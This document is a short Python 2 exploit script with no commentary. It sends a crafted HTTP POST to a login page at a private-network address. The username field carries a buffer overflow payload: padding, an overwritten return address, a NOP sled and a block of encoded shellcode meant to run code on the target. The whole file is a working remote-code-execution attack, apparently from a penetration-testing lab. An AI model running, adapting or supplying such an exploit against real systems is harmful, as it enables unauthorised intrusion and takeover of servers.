#!/usr/bin/python
import socket
import time
import sys

size = 800

shellcode = ("\xb8\x5c\x0b\x51\x1c\xdb\xd2\xd9\x74\x24\xf4\x5a\x31\xc9"
             "\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x9e\x0f\xb3\xe9\xe2"
             "\xf8\xb1\x12\x1a\xf9\xd5\x9b\xff\xc8\xd5\xf8\x74\x7a\xe6"
             "\x8b\xd8\x77\x8d\xde\xc8\x0c\xe3\xf6\xff\xa5\x4e\x21\xce"
             "\x36\xe2\x11\x51\xb5\xf9\x45\xb1\x84\x31\x98\xb0\xc1\x2c"
             "\x51\xe0\x9a\x3b\xc4\x14\xae\x76\xd5\x9f\xfc\x97\x5d\x7c"
             "\xb4\x96\x4c\xd3\xce\xc0\x4e\xd2\x03\x79\xc7\xcc\x40\x44"
             "\x91\x67\xb2\x32\x20\xa1\x8a\xbb\x8f\x8c\x22\x4e\xd1\xc9"
             "\x85\xb1\xa4\x23\xf6\x4c\xbf\xf0\x84\x8a\x4a\xe2\x2f\x58"
             "\xec\xce\xce\x8d\x6b\x85\xdd\x7a\xff\xc1\xc1\x7d\x2c\x7a"
             "\xfd\xf6\xd3\xac\x77\x4c\xf0\x68\xd3\x16\x99\x29\xb9\xf9"
             "\xa6\x29\x62\xa5\x02\x22\x8f\xb2\x3e\x69\xd8\x77\x73\x91"
             "\x18\x10\x04\xe2\x2a\xbf\xbe\x6c\x07\x48\x19\x6b\x68\x63"
             "\xdd\xe3\x97\x8c\x1e\x2a\x5c\xd8\x4e\x44\x75\x61\x05\x94"
             "\x7a\xb4\x8a\xc4\xd4\x67\x6b\xb4\x94\xd7\x03\xde\x1a\x07"
             "\x33\xe1\xf0\x20\xde\x18\x93\x8e\xb7\x55\xa0\x67\xca\x99"
             "\x05\x51\x43\x7f\x23\xb1\x05\x28\xdc\x28\x0c\xa2\x7d\xb4"
             "\x9a\xcf\xbe\x3e\x29\x30\x70\xb7\x44\x22\xe5\x37\x13\x18"
             "\xa0\x48\x89\x34\x2e\xda\x56\xc4\x39\xc7\xc0\x93\x6e\x39"
             "\x19\x71\x83\x60\xb3\x67\x5e\xf4\xfc\x23\x85\xc5\x03\xaa"
             "\x48\x71\x20\xbc\x94\x7a\x6c\xe8\x48\x2d\x3a\x46\x2f\x87"
             "\x8c\x30\xf9\x74\x47\xd4\x7c\xb7\x58\xa2\x80\x92\x2e\x4a"
             "\x30\x4b\x77\x75\xfd\x1b\x7f\x0e\xe3\xbb\x80\xc5\xa7\xdc"
             "\x62\xcf\xdd\x74\x3b\x9a\x5f\x19\xbc\x71\xa3\x24\x3f\x73"
             "\x5c\xd3\x5f\xf6\x59\x9f\xe7\xeb\x13\xb0\x8d\x0b\x87\xb1"
             "\x87")

while(size < 900):
  try:
    print "\nSending evil buffer with %s bytes" % size
    
    inputBuffer = "A" * 780
    inputBuffer += "\x83\x0c\x09\x10"
    inputBuffer += "\x90" * 20
    inputBuffer += shellcode
    
    content = "username=" + inputBuffer + "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.195.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.195.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    
    buffer += content

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    
    s.connect(("192.168.195.10", 80))
    s.send(buffer)
    
    s.close()

    size += 100
    time.sleep(10)
    
  except:
    print "\nCould not connect!"
    sys.exit()